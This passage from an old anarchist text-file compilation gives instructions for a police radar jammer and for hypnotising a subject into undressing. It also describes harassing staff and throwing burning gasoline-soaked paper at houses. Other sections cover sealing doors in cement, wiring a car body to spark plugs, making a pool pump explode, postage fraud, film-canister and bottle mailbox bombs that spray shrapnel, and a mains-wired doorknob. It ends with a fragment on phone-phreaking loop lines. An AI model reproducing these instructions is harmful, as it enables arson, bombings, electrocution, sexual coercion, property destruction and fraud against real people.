dimensions as those given, will furthur reduce the signature of the 
system.

How to use:
----------

1) Thread the low signature system on the selected weapon securely.
2) Place the proper cotton wad size into the muzzle end of the system 
(see table 2)
3) Load weapon
4) Weapon is now ready for use

Most drivers wanting to make better time on the open road will 
invest in one of those expensive radar detectors. However, this 
device will not work against a gun type radar unit in which the 
radar signal is not present until the cop has your car in his 
sights and pulls the trigger. Then it is TOO LATE for you to slow 
down. A better method is to continuously jam any signal with a 
radar signal of your own. I have tested this idea with the 
cooperation of a local cop and found that his unit reads random 
numbers when my car approached him. It is suprisingly easy to make 
a low power radar transmitter. A nifty little semiconductor called 
a Gunn Diode will generate microwaves when supplied with the 5 to 
10 volt DC and enclosed in the correct size cavity (resonater). An 
8 to 3 terminal regulator can be used to get this voltage from a 
car's 12v system. However, the correct construction and tuning of 
the cavity is difficult without good microwave measurement 
equipment. Police radars commonly operate on the K band at 22 ghz. 
Or more often on the X band at 10.525 ghz. most microwave intruder 
alarms and motion detectors (mounted over automatic doors in 
supermarkets & banks, etc.) contain a Gunn type 
transmitter/receiver combination that transmits about 10 kilowatts 
at 10.525 ghz. These units work perfectly as jammers. If you 
cannot get one locally, write to Microwave Associates in 
Burlington, Massachusettes and ask them for info on 'Gunnplexers' 
for ham radio use. When you get the unit it may be mounted in a 
plastic box on the dash or in a weather-proff enclosure behind the 
PLASTIC grille. Switch on the power when on an open highway. The 
unit will not jam radar to the side or behind the car so don't go 
speeding past the radar trap. An interesting phenomena you will 
notice is that the drivers who are in front of you who are using 
detectors will hit their brakes as you approach large metal signs 
and bridges. Your signal is bouncing off of these objects and 
triggering their radar detectors!       HAVE FUN!

+-------------------+
! WHAT HYPNOTISM IS !
+-------------------+

HYPNOTISM, CONTRARY TO COMMON BELEIF, IS MERELY STATE WHEN YOUR MIND AND
BODY ARE IN A STATE OF RELAXATION AND YOUR MIND IS OPEN TO POSITIVE, OR
CLEVERLY WORDED NEGATIVE, INFLUENCES.  IT IS NOT A TRANCE WHERE YOU:
                  > ARE TOTALLY INFLUENCABLE.
                  > CANNOT LIE.
                  > A SLEEP WHICH YOU CANNOT WAKE UP FROM
                    WITHOUT HELP.
THIS MAY BRING DOWN YOUR HOPE SOMEWHAT, BUT, HYPNOTISM IS A POWERFUL FOR
SELF HELP, AND/OR MISCHEIF.

+-----------------------+
! YOUR SUBCONCIOUS MIND !
+-----------------------+

BEFORE GOING IN FURTHER, I'D LIKE TO STATE THAT HYPNOTISM NOT ONLY IS
GREAT IN THE WAY THAT IT RELAXES YOU AND GETS YOU (IN THE LONG RUN) WHAT
YOU WANT, BUT ALSO THAT IT TAPS A FORCE OF INCREDIBLE POWER, BELEIVE IT OR
NOT, THIS POWER IS YOUR SUBCONCIOUS MIND.
THE SUBCONCIOUS MIND ALWAYS KNOWS WHAT IS GOING ON WITH EVERY PART OF YOUR BODY,
EVERY MOMENT OF THE DAY.  IT PROTECTS YOU FROM NEGATIVE INFLUENCES,
AND RETAINS THE POWER TO SLOW YOUR HEARTBEAT DOWN AND STUFF LIKE THAT.
THE SUBCONCIOUS MIND HOLDS JUST ABOUT ALL THE INFO YOU WOULD LIKE TO KNOW
ABOUT YOURSELF, OR, IN THIS CASE, THE PERSON YOU WILL BE HYPNOTISING.
THERE ARE MANY WAYS TO TALK TO YOUR SUBCONCIOUS AND HAVE IT TALK BACK TO
YOU. ONE WAY IS THE OUJA BOARD, NO ITS NOT A SPIRIT, MERELY THE
MINDS OF THOSE WHO ARE USING IT.  ANOTHER, WHICH I WILL DISCUSS HERE,
IS THE PENDULUM METHOD.  OK, HERE IS HOW IT GOES.
FIRST, GET A RING OR A WASHER AND TIE IT TO A THREAD A LITTLE LONGER THAN
HALF OF YOUR FOREARM.  NOW, TAKE A SHEET OF PAPER AND DRAW A BIG CIRCLE IN
IT.  IN THE BIG CIRCLE YOU MUST NOW DRAW A CROSSHAIR (A BIG +).  NOW, PUT
THE SHEET OF PAPER ON A TABLE.  NEXT, HOLD THE THREAD WITH THE RING OR
WASHER ON IT AND PLACE IT (HOLDING THE THREAD SO THAT THE RING IS 1 INCH
ABOVE THE PAPER SWINGING) IN THE MIDDLE OF THE CROSSHAIR.  NOW, SWING
THE THREAD SO THE WASHER GOES UP AND DOWN, SAY TO YOURSELF THE WORD "YES"
NOW, DO IT SIDE TO SIDE AND SAY THE WORD "NO".
DO IT COUNTER CLOCKWISE AND SAY "I DON'T KNOW".
AND LASTLY, DO IT CLOCKWISE AND SAY "I DONT WANT TO SAY." NOW, WITH THE
THREAD BACK IN THE MIDDLE OF THE CROSSHAIR, ASK YOURSELF QUESTIONS AND
WAIT FOR THE PENDULUM TO SWING IN THE DIRECTION FOR THE ANSWER. (YES, NO,
I DONT KNOW OR I DONT WANNA SAY...). SOON, TO YOUR AMAZEMENT, IT WILL BE
ANSWERING QUESTIONS LIKE ANYTHING... LET THE PENDULUM ANSWER, DONT TRY..
WHEN YOU TRY YOU WILL NEVER GET AN ANSWER.  LET THE ANSWER COME TO YOU.

+-------------------------+
! HOW TO INDUCE HYPNOTISM !
+-------------------------+

NOW THAT YOU KNOW HOW TO TALK TO YOUR SUBCONCIOUS MIND, I WILL NOW TELL YOU
HOW TO GUIDE SOMEONE INTO HYPNOSIS. NOTE THAT I SAID GUIDE, YOU CAN NEVER,
HYNOTISE SOMEONE, THEY MUST BE WILLING. OK, THE SUBJECT MUST BE LYING OR
SITTING IN A COMFORTABLE POSITION, RELAXED, AND AT A TIME WHEN THINGS ARENT
GOING TO BE INTERRUPTED.
TELL THEM THE FOLLOWING OR SOMETHING CLOSE TO IT, IN A PEACEFUL, MONOTINOUS
TONE (NOT A COMMANDING TONE OF VOICE)

NOTE:  LIGHT A CANDLE AND PLACE IT SOMEWHERE WHERE IT CAN BE EASILY SEEN.

TAKE A DEEP BREATH THROUGH YOUR NOSE AND HOLD IT IN FOR A COUNT OF 8. NOW,
THROUGH YOUR MOUTH, EXHALE COMPLETELY AND SLOWLY. CONTINUED BREATHING LONG,
DEEP, BREATHS THROUGH YOUR NOSE AND EXHALING THROUGH YOUR MOUTH.  TENSE UP
ALL YOUR MUSCLES VERY TIGHT, NOW, COUNTING FROM TEN TO ONE, RELEASE THEM
SLOWLY, YOU WILL FIND THEM VERY RELAXED.  NOW, LOOK AT THE CANDLE, AS
YOU LOOK AT IT, WITH EVERY BREATH AND PASSING MOMEMENT, YOU ARE FEELING
INCREASINGLY MORE AND MORE PEACEFUL AND RELAXED.  THE CANDLES FLAME IS
PEACEFUL AND BRIGHT.
AS YOU LOOK AT IT I WILL COUNT FROM 100 DOWN, AS A COUNT, YOUR EYES WILL
BECOME MORE AND MORE RELAXED, GETTING MORE AND MORE TIRED WITH EACH
PASSING MOMENT."
NOW, COUNT DOWN FROM 100, ABOUT EVERY 10 NUMBERS SAY "WHEN I REACH XX YOUR
EYES (OR YOU WILL FIND YOUR EYES) ARE BECOMING MORE AND MORE TIRED."  TELL
THEM THEY MAY CLOSE THEIR EYES WHENEVER THEY FEEL LIKE IT.  IF THE PERSONS
EYES ARE STILL OPEN WHEN YOU GET TO 50 THEN INSTEAD OF SAYING
"YOUR EYES WILL.."
SAY "YOUR EYES ARE...".
WHEN THEIR EYES ARE SHUT SAY THE FOLLOWING. AS YOU LIE (OR SIT) HERE WITH
YOUR EYES COMFORTABLY CLOSE YOU FIND YOURSELF RELAXING MORE AND
MORE WITH EACH MOMENT AND BREATH.
THE RELAXATION FEELS PLEASANT AND BLISSFUL SO, YOU HAPPILY GIVE WAY TO
THIS WONDERFUL FEELING. IMAGINGE YOURSELF ON A CLOUD, RESTING PEACEFULLY,
WITH A SLIGHT BREEZE CARESSING YOUR BODY.  A TINGLING SENSASION BEGINS
TO WORK ITS WAY, WITHIN AND WITHOUT YOUR TOES, IT SLOWLY MOVES UP YOUR
FEET, MAKING THEM WARM, HEAVY AND RELAXED. THE CLOUD IS SOFT AND SUPPORTS
YOUR BODY WITH ITS SOFT TEXTURE, THE SCENE IS PEACEFUL AND ABSORBING,
THE PEACEFULNESS ABSORBS YOU COMPLETELY... 
THE TINGLING GENTLY AND SLOWLY MOVES UP YOUR LEGS, RELAXING THEM.
MAKING THEM WARM AND HEAVY.  THE RELAXATION FEELS VERY GOOD, IT FEELS SO
GOOD TO RELAX AND LET GO. AS THE TINGLING CONTINUES ITS JOURNEY UP INTO
YOUR SOLAR PLEXUS, YOU FEEL YOUR INNER STOMACH BECOME VERY RELAXED.  NOW,
IT MOVES SLOWLY INTO YOUR CHEST, MAKING YOUR BREATHING RELAXED AS WELL.
THE FEELING BEGINS TO MOVE UP YOUR ARMS TO YOUR SHOULDERS, MAKING YOUR ARMS
HEAVY AND RELAXED AS WELL.  YOU ARE AWARE OF THE TOTAL RELAXATION YOU ARE
NOW EXPERIENCING, AND YOU GIVE WAY TO IT.  IT IS GOOD AND PEACEFUL, THE
TINGLING NOW MOVEVES INTO YOUR FACE AND HEAD, RELAXING YOUR JAWS, NECK, AND
FACIAL MUSCLES, MAKING YOUR CARES AND WORRIES FLOAT AWAY. AWAY INTO THE
BLUE SKY AS YOU REST BLISFUlLY ON THE CLOUD....
IF THEY ARE NOT RESPONSIVE OR YOU THINK THEY (HE OR SHE..) IS GOING TO
SLEEP, THEN ADD IN A "...ALWAYS CONCENTRATING UPON MY VOICE, INGORING ALL
OTHER SOUNDS.  EVEN THOUGH OTHER SOUNDS EXSIST, THEY AID YOU IN YOUR
RELAXATION..." THEY SHOULD SOON LET OUT A SIGH AS IF THEY WERE LETTING GO,
AND THEIR FACE SHOULD HAVE A "WOODENESS" TO IT, BECOMING FEATURLESS... NOW,
SAY THE FOLLOWING "....  YOU NOW FIND YOURSELF IN A HALLWAY, THE HALLWAY IS
PEACEFUL AND NICE. AS I COUNT FROM 10 TO 1 YOU WILL IMAGINE YOURSELF
WALKING FURTHER AND FURTHER DOWN THE HALL. WHEN I REACH ONE YOU WILL FIND
YOURSELF WHERE YOU WANT TO BE, IN ANOTHER, HIGHER STATE OF CONCIOUS AND
MIND. (COUNT FROM TEN TO ONE)....." DO THIS ABOUT THREE OR FOUR TIMES.
THEN, TO TEST IF THE SUBJECT IS UNDER HYPNOSIS OR NOT, SAY....
"...YOU FEEL A STRANGE SENSATION IN YOUR (ARM THEY WRITE WITH) ARM, THE
FEELING BEGINS AT YOUR FINGERS AND SLOWLY MOVES UP YOUR ARM, AS IT MOVES
THROUGH YOUR ARM YOUR ARM BECOMES LIGHTER AND LIGHTER, IT WILL SOON BE SO
LIGHT IT WILL .....  BECOMING LIGHTER AND LIGHTER WHICH EACH BREATH AND
MOMENT..."
THEIR FINGERS SHOULD BEGIN TO TWITCH AND THEN MOVE UP, THE ARM FOLLOWING,
NOW MY FRIEND, YOU HAVE HIM/HEP IN HYPNOSIS.  THE FIRST TIME YOU DO THIS,
WHILE HE/SHE IS UNDER SAY GOOD THINGS, LIKE:  "YOUR GOING TO FEEL GREAT
TOMORROW" OR "EVERY DAY IN EVERY WAY YOU WILL FIND YOURSELF BECOMING BETTER
AND BETTER".. OR SOME CRAP LIKE THAT... THE MORE THEY GO UNDER, THE DEEPER
IN HYPNOSIS THEY WILL GET EACH TIME YOU DO IT.

+----------------------------+
! WHAT TO DO WHEN HYPNOTISED !
+----------------------------+

WHEN YOU HAVE THEM UNDER YOU MUST WORD THINGS VERY CAREFULLY TO GET YOUR
WAY. YOU CANNOT SIMPLY SAY...  TAKE OFF YOUR CLOTHES AND FUCK THE PILLOW.
NO, THAT WOULD NOT REALLY DO THE TRICK. YOU MUST SAY SOMETHING LIKE....
"YOU FIND YOUR SELF AT HOME, IN YOUR ROOM AND YOU HAVE TO TAKE A SHOWER
(VIVIDLY DESCRIBE THEIR ROOM AND WHATS HAPPENING), YOU BEGIN TO TAKE OFF
YOUR CLOTHES..."  NOW, IT CANT BE THAT SIMPLE, YOU MUST KNOW THE PERSONS
HOUSE, ROOM, AND SHOWER ROOM. THEN DESCRIBE THINGS VIVIDLY AND TELL THEM
TO ACT IT OUT (THEY HAVE TO BE DEEPLY UNDER TO DO THIS...).  I WOULD JUST
SUGGEST THAT YOU EXPERIMENT A WHILE, AND GET TO KNOW HO; TO DO THINGS.

+-----------+
! WAKING UP !
+-----------+

WAKING UP IS VERY EASY, JUST SAY.. "...AS I COUNT FROM 1 TO 5 YOU WILL
FIND YOURSELF BECOMMING MORE AND MORE AWAKE, MORE AND MORE LIVELY.  WHEN
YOU WAKE UP YOU WILL FIND YOURSELF COMPLETELY ALIVE, AWAKE, AND REFRESHED.
MENTALLY AND PHYSICALLY, REMEMBERING THE PLEASANT SENSATION THAT HYPNOSIS
BRINGS...  WAKING UP FEELING LIKE A NEW BORN BABY, REBORN WITH LIFE AND
VIGOR, FEELING EXCELLENT. REMEMBERING THAT NEXT TIME YOU ENTER HYPNOSIS IT
WILL BECOME AN EVER INCREASING DEEPER AND DEEPER STATE THAN BEFORE.
1- YOU FEEL ENERGY COURSE THROUGHOUT YOUR LIMBS.
2- YOU BEGIN TO BREATHE DEEPLY, STIRRING.
3- BEGINING TO MOVE MORE AND MORE YOUR EYES OPEN, BRINGING YOU UP TO
FULL CONCIOUS.
4- YOU ARE UP,UP, UP AND AWAKENING MORE AND MORE.
5- YOU ARE AWAKE AND FEELING GREAT."

AND THATS IT!  YOU NOW KNOW HOW TO HYPNOTISE YOURSELF AND SOMEONE ELSE.
YOU WILL LEARN MORE AND MORE AS YOU EXPERIMENT.

Fun at K-Mart                                   by the Jolly Roger

Well, first off, one must realise the importance of K-Marts in
society today. First off, K-Marts provide things cheaper to those who
can't afford to shop at higher quality stores.  Although, all I ever
see in there is minorities and Senior Citizens, and the poor people in
our city.  Personally, I wouldn't be caught dead in there.  But, once,
I did.
You see, once, after The Moon Roach and Havoc Chaos(Dear friends of
mine) and I were exploring such fun things as rooftops, we came along
a K-Mart.  Amused, and cold for that matter, we wandered in.  The
Tension mounts.
As we walked up to the entrance, we were nearly attacked by Youth
Groups selling cheap cookies, and wheelchair sticken people selling
American Flags.  After laughing at these people, we entered. This is
where the real fun begins...
First, we wandered around the store, and turned on all the blue
lights we could find. That really distracts and confuses the
attendents...Fun to do...
The first neat thing, is to go to the section of the store where
they sell computers. Darkness engulf the earth the day they find Apple
Computers being sold there.  Instead, lesser computers like the
laughable C-64 can be found there...Turn it on, and make sure
nobody's looking...Then, once in Basic, type...

]10 PRINT "Fuck the world!  Anarchy Rules!" (or something to that
                                             effect.)
]20 GOTO 10 and walk away.

Also, set the sample radios in the store to a santanic rock station,
and turn the radio off.  Then, set the alarm for two minutes ahead of
the time displayed there.  Turn the volume up all the way, and walk
away.  After about two minutes, you will see the clerk feebly attempt
to turn the radio down or off.  It's really neat to set ten or more
radios to different stations, and walk away.
One of my favorite things to do, is to get onto the intercom system
of the store.  Easier typed then done.  First, check out the garden
department.  You say there's no attendent there? Good.  Sneak
carefully over to the phone behind the cheap counter there, and pick
it up.  Dial the number corrisponding to the item that says 'PAGE'...
And talk.  You will note that your voice will echo all over the bowels
of K-Mart.
I would suggest announcing something on the lines of: "Anarchy
rules!!"

How To Terrorize McDonalds                       by the Jolly Roger
     (Originally an Apple ][ file so excuse the upper case!!!)

NOW, ALTHOUGH Mc DONALDS IS FAMOUS FOR IT'S ADVERTISING AND MAKING THE
WHOLE WORLD THINK THAT THE BIG MAC IS THE BEST THING TO COME ALONG SINCE
SLICED BREAD (BUNS?), EACH LITTLE RESTAURANT IS AS AMATEUR AND SIMPLE AS
A NEW-FOUND BUSNESS. NOT ONLY ARE ALL THE EMPLOYEES RATHER INEXPERIENCED
AT WHAT THEY'RE =SUPPOSED= TO DO, BUT THEY WILL JUST LOOSE ALL CONTROL WHEN
AN EMERGENCY OCCURS....HERE WE GO!!! FIRST, GET A FEW FRIENDS (4 IS
GOOD...I'LL GET TO THIS LATER) AND ENTER THE MCDONALDS RESTAURANT, TALKING
LOUDLY AND REAKING OF SOME STRANGE SMELL THAT AUTOMATICALLY MAKES THE OLD
COUPLE SITTING BY THE DOOR LEAVE. IF ONE OF THOSE PIMPLY-FACED GOONS IS
WIPING THE FLOOR, THEN TRACK SOME CRAP ALL OVER IT (YOU COULD PRETEND TO
SLIP AND BREAK YOUR HEAD, BUT YOU MIGHT ACTUALLY DO SO).
NEXT, BEFORE YOU GET THE FOOD, FIND A TABLE. START YELLING AND RELEASING
SOME STRANGE BODY ODOR SO =ANYBODY= WOULD LEAVE THEIR TABLE AND WALK OUT
THE DOOR. SIT 2 FRIENDS THERE, AND GO UP TO THE COUNTER WITH ANOTHER.
FIND A PLACE WHERE THE LINE IS SHORT, OR IF THE LINE IS LONG SAY "I ONLY
WANNA BUY A COKE" AND YOU GET MOVED UP. NOW, YOU GET TO DO THE =ORDERING=
...HEH HEH HEH. SOMEBODY =ALWAYS= MUST WANT A PLAIN
HAMBURGER WITH ABSOLUTELY NOTHING ON IT (THIS TAKES EXTRA TIME TO MAKE, AND
DRIVES THE LITTLE HAMBURGER-MAKERS INSANE)..ORDER A 9-PACK OF CHICKEN
MCNUGGETS...NO, A 20 PACK...NO, THREE 6 PACKS...WAIT...GO BACK TO THE TABLE
AND ASK WHO WANTS WHAT. YOUR OTHER FRIEND WAITS BY THE COUNTER AND MAKES A
PASS AT THE FEMALE CLERK. GET BACK TO THE THING AND ORDER THREE 6-PACKS OF
CHICKEN ETC....NOW SHE SAYS "WHAT KIND OF SAUCE WOULD YOU LIKE?".OF COURSE,
SAY THAT YOU ALL WANT BARBECUE SAUCE ONE OF YOUR FRIENDS WANTS 2 (ONLY IF
THERE ARE ONLY 2 CONTAINERS OF BARBECUE SAUCE LEFT).THEN THEY HAFTA GO INTO
THE STOREROOM AND OPEN UP ANOTHER BOX. FINALLY, THE DRINKS...SOMEBODY WANTS
COKE, SOMEBODY ROOT BEER, AND SOMEBODY DIET COKE. AFTER THESE ARE DELIVERED,
BRING THEM BACK AND SAY "I DIDN'T ORDER A DIET COKE! I ORDERED A SPRITE!"
THIS GETS THEM MAD; BETTER YET, TURN DOWN SOMETHING TERRIBLE THAT NOBODY
WANTS TO DRINK, SO THEY HAFTA THROW THE DRINK AWAY; THEY CAN'T SELL IT.
AFTER ALL THE FOOD(?) IS HANDED TO YOU, YOU MUST =NEVER= HAVE ENOUGH MONEY
TO PAY. THE CLERK WILL BE SO ANGRY AND CONFUSED THAT SHE'LL LET YA GET
AWAY WITH IT (ANOTHER INFLUENCE ON HER IS YOUR FRIEND ASKING HER "IF YOU
LET US GO I'LL GO OUT WITH YOU" AND GIVING HER A FAKE FONE NUMBER).
NOW, BACK TO YOUR TABLE. BUT FIRST, SOMEBODY LIKES KETCHUP AND MUSTARD.
AND PLENTY (TOO MUCH) OF NAPKINS. OH, AND SOMEBODY LIKES FORKS AND KNIVES,
SO ALWAYS END UP BREAKING THE ONES YOU PICK OUTTA THE BOX. HAVE YOUR
FRIENDS YELL OUT,"YAY!!!!! WE HAVE MUNCHIES!!" AS LOUD AS THEY CAN.
THAT'LL WORRY THE ENTIRE RESTAURANT. PROCEED TO SIT DOWN. SO, YOU ARE
SITTING IN THE SMOKING SECTION (BY ACCIDENT) EH? WELL, WHILE ONE OF THE
TOBACCO-BREATHERS ISN'T LOOKING, PUT A SIGN FROM THE OTHER SIDE OF THE
ROOM SAYING "DO NOT SMOKE HERE" AND HE'LL HAFTA MOVE...THEN HE GOES INTO
THE REAL NON-SMOKING SECTION, AND GETS YELLED AT. HE THEN THINKS THAT
NO SMOKING IS ALLOWED IN THE RESTAURANT, SO HE EATS OUTSIDE (IN THE POUR-
ING RAIN) AFTER YOUR MEAL IS FINISHED (AND QUITE A FEW SPLATTERED-OPENED
KETCHUP PACKETS ARE ALL OVER YER TABLE), TRY TO LEAVE. BUT OOPS! SOMEBODY
HAS TO DO HIS DUTY IN THE MEN'S ROOM. AS HE GOES THERE, HE STICKS AN
UNEATED HAMBURGGR (WOULD YOU DARE TO EAT ONE OF THEIR HAMBURGERS?)
INSIDE THE TOILET, FLUSHES IT A WHILE,UNTIL IT RUNS ALL OVER THE BATHROOM.
OOPS! SEND A PIMPLY-FACED TEENAGER TO CLEAN IT UP. (HE WON'T KNOW THAT
BROWN THING IS A HAMBURGER, AND HE'LL GET SICK. WHEEE!)
AS YOU LEAVE THE RESTCURANT, LOOKING BACK AT YOUR UNCLEANED TABLE, SOMEBODY
MUST REMEMBER THAT THEY LEFT THEIR CHOCOLATE SHAKE THERE! THE ONE THAT'S
ALMOST FULL!!!! HE TAKES IT THEN SAYS "THIS TASTES LIKE CRAP!", THEN HE
TAKES OFF THE LID AND THROWS IT INTO THE GARBAGE CAN...OOPS! HE MISSED,
AND NOW THE SAME POOR SOUL WHO'S CLEANING UP THE BATHROOM NOW HASTA CLEAN
UP CHOCOLATE SHAKE. THEN LEAVE THE JOINT, REVERSING THE "YES, WE'RE OPEN"
SIGN (AS A REMINDER OF YER VISIT THERE YOU HAVE IT! YOU HAVE JUST PUT
ALL OF MCDONALDS INTO COMPLETE MAYHEM. AND SINCE THERE IS NO PENALTY FOR
LITTERING IN A RESTAURANT, BUGGING PEOPLE IN A PUBLIC EATERY (OR

Operation: Fuckup                                 by the Jolly Roger

This is a guide for Anarchists and can be funny for non-believers and 12
and 13 year old runts, and can be a lexicon of deadly knowledge for True
Anarchists... Serious damage is intended to be dealt here. Do not try
this stuff unless you want to do a lot of serious Anarchy. 
[Simulation]
Asshole - 'Listen, you little teenager punk shit, shut the fuck up, or I'll
knock you down!'
Anarchist - 'O.K.....You can't say I didn't warn you. You don't know my 
true power...' (soooo casually)
Asshole - 'Well, er, what do you mean? 
Anarchist - '<demoniac grin>'
As you can see, the Anarchist knows something that this asshole doesn't...

[Operation Fuckup]
Geta wheel barrel or two. Fill with gasoline. Get 16 rolls of toilet
paper, unroll & drench in the gasoline. Rip to shreds in gasoline. Get
asbestos gloves. Light a flare (to be punk), grab glob of
saturated toilet paper (you can ignite the glob or not). Throw either
flaming or dripping glob into:
any window (picture is the best)
front doors
rough grain siding
and best of all, brick walls.
First of all, this bitch is near impossible to get off once dried, and
is a terror to people inside when lit! After this... during the
night, get a pickup truck, a few wheel-barrels, and a dozen friends with 
shovels. The pickup can be used only for transporting people
and equipment, or doing that, and carting all the dirt. When it gets
around 12:00 (after the loser goes beddie - bye), dig a gargantuan hole
in his front yard until about 3:00. You can either assign three or four
of your friends to cart the dirt ten miles away in the pickup-bed, or
bury his front door in 15' of dirt! After that is done, get
three or four buckets of tar, and coat his windows. You can make an
added twist by igniting the tar when you are all done and ready to
run! That is if the loser has a house. If he lives inside an apartment
building, you must direct the attack more toward his car, and front door.
I usually start out when he goes to work...I find out what his cheap car
looks like, and memorize it for future abuse...It is always fun to paint
his front door (apt.) hot pink with purple polka-dots, and off-neon
colors in diagonal stripes. You can also pound a few hundred or so four
inch nails into his front door (this looks like somebody really
doesn't like you from the inside). Another great is to fill his keyhole
with liquid steel so that after the bastard closes his door - the
only way to get back in is to break it down. If you can spare it, leave
him an axe - that is, implanted three inches into, and through the door!
Now, this next one is difficult, but one of the best! Get a piece of wood
siding that will more than cover his front door completely. Nail two by
fours on the edges of the siding (all except the bottom) so you have
a barge - like contraption. Make a hole at the top that will be large
enough for a cement slide. Mix about six or seven LARGE bags of QUICK
drying cement. Use the cement slide to fill the antichamber created by
the 'barge' that is around his door. Use more two by fours to brace
your little cement-filled barge, and let the little gem dry. When it is,
remove the 'barge' so only a stone monolith remains that covers his door.
Use any remaining cement to make a base around this so he can't just push
it over. When I did this, he called the fire department, and they thought
he meant wood, so they brought axes. I watched with a few dozen or so
other tenants, and laughed my damn ass off! This is only his door! After
he parks his car for the night, the fun really begins...I start out
by opening up the car by jamming a very thin, but loack - inside and out!
Then proceed to put orange-juice syrup all over the seats, so after he
gets through all the other shit that you do, he will have the stickiest
seats in the world. You can then get a few Sunday papers, and crack one of
the windows about four inches. Lightly crumple the papers, and continue to
completely fill the inside of his car with the newspapers. A copy of the
Sunday New York Times will nicely fill a Volkeswagon! What is also quite
amusing is to put his car on cinder blocks, slash his tires at the top, and
fill them with cement! Leave the cinder blocks there so that, after he
knocks the car off of them, he will get about 3 miles to the gallon with
those tires, and do 0 to 60 in about two minutes! It is even more
hilarious when he doesn't know why the hell why! Another is to open his
hood, and then run a few wires from the sparkplugs to the METAL body.
The sure is one HOT car when it is running! Now, I like to pour two pounds
of sugar down his gas tank. If this doesn't blow every gasket in his
engine it will do something called 'carmelizing his engine'. This is when
the extreme heat turns the sugar to carmel, and you literally must
completely take the engine out and apart, and clean each and every
individual part!
Well, if this asshole does not get the message, you had better start to
get serious. If this guide was used properly & as it was intended (no,
not as kindling for the fire), this asshole will either move far away,
seek professional psychological help, commit suicide,
or all of the above!

Pool Fun                                        by the Jolly Roger

First of all, you need know nothing about pools.  The only thing
you need know is what a pool filter looks like.  If you don't know that.
Second, dress casual.  Preferably, in black.  Visit your
"friends" house, the one whose pool looks like fun!!)  Then you
reverse the polarity of his/her pool, by switching the wires around.
They are located in the back of the pump. This will have quite an
effect when the pump goes on.  In other words. Boooooooooooommm!
Thats right, when you mix + wires with - plugs, and vice- versa, the
4th of july happens again.
Not into total destruction??? When the pump is off, switch the
pump to "backwash".  Turn the pump on and get the phuck out!  When you
look the next day, phunny.  The pool is dry.  If you want permanant
damage, yet no great display like my first one mentioned, shut the
valves of the pool off. (There are usually 2)  One that goes to the
main drain and one that goes to the filter in the pool.  That should
be enough to have one dead pump.  The pump must take in water, so when
there isn't any...
Practical jokes:  these next ones deal with true friends and
there is *no* permanent damage done.  If you have a pool, you must
check the pool with chemicals.  There is one labeled orthotolidine.
The other is labeled alkaline (ph).  You want orthotolidine. (It
checks the chlorine). 
Go to your local pool store and tell them you're going into the pool
business, and to sell you orthotolidine (a
CL detector)   Buy this in great quantities if possible.  The solution
is clear.  You fill 2 baggies with this chemical.  And sew the bags to
the inside of your suit.  Next, go swimming with your friend!  
Then open the bags and look like you're enjoying a piss.  And anyone
there will turn a deep red!  They will be embarrased so much,
Especially if they have guests there! Explain what it is, then add
vinegar to the pool.  Only a little.  The "piss" disappears.

HAHA!!          --------------RFLAGG------------



Free Postage                                    by the Jolly Roger

The increasing cost of postage to mail letters and packages is
bringing down our standard of living.  To remedy this deplorable
situation, some counter control measures can be applied.
For example, if the stamps on a letter are coated with Elmer's
Glue by the sender, the cancellation mark will not destroy the stamp:
the Elmer/s drives to form an almost invisible coating that protects
the stamps from the cancellation ink. Later, the receiver of the
letter can remove the cancellation mark with water and reuse the
stamps. Furthermore, ecological saving will also result from recycling
the stamps.  Help save a tree.
The glue is most efficently applied with a brush with stiff,
short bristles.  Just dip the brush directly into the glue and spread
it on evenly, covering the entire surface of the stamp.  It will dry
in about 15 minutes.
For mailing packages, just follow the same procedure as outlined
above; however, the package should be weighed and checked to make sure
that it has the correct amount of postage on it before it is taken to
the Post Office.
Removing the cancellation and the glue from the stamps can be
easily accomplished by soaking the stamps in warm water until they
float free from the paper.  The stamps can then be put onto a paper
towel to dry.  Processing stamps in large batches saves time too.
Also, it may be helpful to write the word 'Elmer' at the top of the
letter (not on the envelope) to cue the receiving party in that the
stamps have been protected with the glue.
We all know that mailing packages can be expensive.  And we also
know that the handicapped are sometimes discriminated against in jobs.
The Government, being the generous people they are, have given the
blind free postal service.
Simply address you envelope as usual, and make one modification.
In the corner where the stamp would go, write in (or stamp) the words
'FREE MATTER FOR THE BLIND".  Then drop you package or letter in one
of the blue fedral mailboxes.  DO NOT TAKE THE LETTER TO THE POST
OFFICE, OR LEAVE IT IN YOUR MAILBOX.
Sounds very nice of the government to do this, right?  Well, they
aren't that nice.  The parcel is sent library rate, that is below
third class.  It may take four to five days to send a letter to just
the next town.
This too is quite simple, but less effective.  Put the address
that you are sending the letter to as the return address.  If you were
sending a $20 donation to the pirate's Chest, you would put our
address (po box 644, lincoln ma. 01773) as the return address.
Then you would have to be carless and forget to put the stamp on
the envelope.  A nice touch is to put a bullshit address in the center
of the envelope.
Again, you MUST drop the letter in a FEDRAL mailbox.  If the post
office doesn't send the letter to the return address for having no
stamp, they will send it back for the reason of "No such address".
Example--

Pirates Chest  Dept. 40DD
P.O. Box 644865
Lincol, Ma. 41773

                 Tom Bullshit
                 20 Fake Road
                 What Ever, XX     99851

One last thing you might try doing is soaking a cancelled stamp
off of an envelope, and gluing it onto one you are sending.  Then burn
the stamp, leaveing a little bit to show that there was one there.

Easy explosive:

-fill Kodak film case (y'know, the black cylinder with the grey cap) 
with explosive of your choice.  Drill hole in grey lid, insert fuse, 
and tape it back together very tightly.  Light.

                        or:

-poke a hole it the grey cap facing outwards, and insert an M-80 
with fuse going through the hole and reseal, taping it tightly ALL 
AROUND the case.  Place in plastic mailbox, light, close door, and 
get the hell away!  Because of the tight airspace, the destructive 
power of the explosion is increased 5X.  Works under water too, with 
a drop of wax, or preferably rubber cement around where the cap and 
wick meet.
                         
                         and:

-fill a GLASS coke/pepsi bottle with 1 part gas, 1 part sugar, & 1 
part water. Wedge an M-80 into the top about halfway.  Shake the 
container, place in mailbox (hopefully with mail {hehe!}) light, and 
get the fuck away.  This thing sends glass shrapnel EVERYWHERE, 
including through their mail.


Doorknob Shocker:

-run a wire from one slot in wall outlet to the bracket in the wall 
that the knob's tongue inserts into.  Run another wire from the 
other slot to an inconspicuous spot on the DOORKNOB.  How does that 
one *grab* you?

Actually, any 1-619-7x9-000x gives tone detect, finding the other 
silent connection is a wee bit harder. 

If anyone manages to complete some of these, or any loops, please 
let me know.


The only bad thing about loop lines, is that eventually the Gestapo 
finds out about the over-use of the line, and assigns the # to 
anyone who wants a new # for their fone.  Then when phreaks begin to 
use the line again, thinking it is a loop, they get a pissed off 
yuppie who then has the call traced, and thats like putting your 
balls right in a door and slamming it.  The operator will complain 
in your face, and say some bullshit like she has your # and will 
